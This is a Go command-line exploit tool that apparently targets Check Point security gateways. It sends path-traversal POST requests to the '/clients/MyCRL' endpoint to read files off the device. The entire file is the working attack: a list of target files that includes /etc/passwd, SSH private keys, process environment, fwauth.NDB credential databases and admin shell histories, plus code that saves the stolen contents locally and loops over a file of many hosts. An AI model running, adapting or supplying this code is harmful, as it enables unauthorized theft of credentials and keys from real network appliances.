package main

import (
    "bytes"
    "crypto/tls"
    "flag"
    "fmt"
    "io/ioutil"
    "net/http"
    "os"
    "path/filepath"
    "regexp"
    "strings"
    "time"

    "github.com/fatih/color"
)


func getFilePaths() []string {
    return []string{
        "/etc/hosts",
        "/etc/passwd",
        "/etc/ssh/sshd_config",
        "/proc/self/environ",
        "/.ssh/id_rsa",
        "/root/.ssh/id_rsa",
        "/config/active",
        "/var/opt/CPsuite-RomPager/4/fw1/conf/fwauth.conf",
        "/var/opt/CPsuite-R81.20/fw1/database/fwauth.NDB",
        "/var/opt/CPsuite-R80.20/fw1/database/fwauth.NDB",
        "/var/opt/CPsuite-R80/fw1/database/fwauth.NDB",
        "/var/opt/CPsuite-R77.30/fw1/database/fwauth.NDB",
        "/opt/fw1/database/fwauth.NDB",
        "/opt/CPsuite-RomPager/4/fw1/conf/users.C",
        "/home/admin/.clish_history",
        "/home/admin/.bashrc",
        "/home/admin/.bash_history",
        "/flash/top_last_hour_report.json",
        "/etc/resolv.conf",
        "/etc/profile.d/CP.sh",
        "/etc/issue",
        "/etc/cp-release",
        "/database/fwauth.NDB",
        "/config/initial_db",
        "/config/active_db",
    }
}


func validateHost(host string) bool {
    ipPortRegex := regexp.MustCompile(`^\d{1,3}(\.\d{1,3}){3}(:\d+)?$`)
    return ipPortRegex.MatchString(host)
}


func makeRequest(client *http.Client, host string, filePath string) error {
    url := fmt.Sprintf("https://%s/clients/MyCRL", host)
    method := "POST"
    requestBody := fmt.Sprintf("aCSHELL/../../../../../../../%s", filePath)

    req, err := http.NewRequest(method, url, bytes.NewBufferString(requestBody))
    if err != nil {
        return fmt.Errorf("error creating request: %w", err)
    }

    req.Header.Add("Host", host)
    req.Header.Add("Content-Length", fmt.Sprintf("%d", len(requestBody)))
    req.Header.Add("Connection", "keep-alive")

    res, err := client.Do(req)
    if err != nil {
        if !strings.Contains(err.Error(), "EOF") {
            return fmt.Errorf("error making request: %w", err)
        }
        return nil
    }
    defer res.Body.Close()

    body, err := ioutil.ReadAll(res.Body)
    if err != nil {
        return fmt.Errorf("error reading response body: %w", err)
    }

    if res.StatusCode == http.StatusNotFound {
        color.Red("File %s NOT FOUND", filePath)
    } else {
        color.Green("Response for %s:", filePath)
        fileName := filepath.Base(filePath)
        hostDir := filepath.Join(".", host)
        if _, err := os.Stat(hostDir); os.IsNotExist(err) {
            os.Mkdir(hostDir, os.ModePerm)
        }
        filePath := filepath.Join(hostDir, fileName)
        err = ioutil.WriteFile(filePath, body, 0644)
        if err != nil {
            fmt.Printf("Failed to write to file %s: %v\n", filePath, err)
        } else {
            fmt.Printf("Data saved to file %s\n", filePath)
        }
    }

    return nil
}


func processHost(client *http.Client, host string, filePaths []string) {
    for _, filePath := range filePaths {
        var err error
        for i := 0; i < 3; i++ {
            err = makeRequest(client, host, filePath)
            if err == nil {
                break
            }
            fmt.Printf("Attempt %d: %v\n", i+1, err)
            time.Sleep(2 * time.Second)
        }
        if err != nil {
            fmt.Printf("Failed to fetch %s after 3 attempts\n", filePath)
        }
    }
}

func main() {
    host := flag.String("host", "", "The target host, e.g., 0.0.0.0:4433")
    all := flag.Bool("ALL", false, "Iterate through a list of file paths")
    file := flag.String("file", "", "File with a list of hosts")
    flag.Parse()

    if *host == "" && *file == "" {
        color.New(color.BgRed, color.FgWhite).Println("Either host or file flag is required")
        flag.Usage()
        return
    }

    if *host != "" {
        if !validateHost(*host) {
            color.New(color.BgRed, color.FgWhite).Println("Wrong input for host")
            flag.Usage()
            return
        }
    }

    if *file != "" {
        hostsFile, err := os.Open(*file)
        if err != nil {
            fmt.Printf("Failed to open hosts file: %v\n", err)
            return
        }
        defer hostsFile.Close()

        hosts, err := ioutil.ReadAll(hostsFile)
        if err != nil {
            fmt.Printf("Failed to read hosts file: %v\n", err)
            return
        }

        for _, host := range strings.Split(string(hosts), "\n") {
            if host == "" {
                continue
            }
            if !validateHost(host) {
                color.New(color.BgRed, color.FgWhite).Println("Wrong input for host in file:", host)
                flag.Usage()
                return
            }
        }
    }

   
    tlsConfig := &tls.Config{
        InsecureSkipVerify: true,
    }

    transport := &http.Transport{
        TLSClientConfig: tlsConfig,
    }

    client := &http.Client{
        Transport: transport,
        Timeout:   30 * time.Second,
    }

    filePaths := getFilePaths()

    if *file != "" {
        hostsFile, err := os.Open(*file)
        if err != nil {
            fmt.Printf("Failed to open hosts file: %v\n", err)
            return
        }
        defer hostsFile.Close()

        hosts, err := ioutil.ReadAll(hostsFile)
        if err != nil {
            fmt.Printf("Failed to read hosts file: %v\n", err)
            return
        }

        for _, host := range strings.Split(string(hosts), "\n") {
            if host == "" {
                continue
            }
            fmt.Printf("Processing host: %s\n", host)
            if *all {
                processHost(client, host, filePaths)
            } else {
               
                processHost(client, host, []string{"/etc/passwd"})
            }
        }
    } else if *host != "" {
        if *all {
            processHost(client, *host, filePaths)
        } else {
            
            processHost(client, *host, []string{"/etc/passwd"})
        }
    }
}
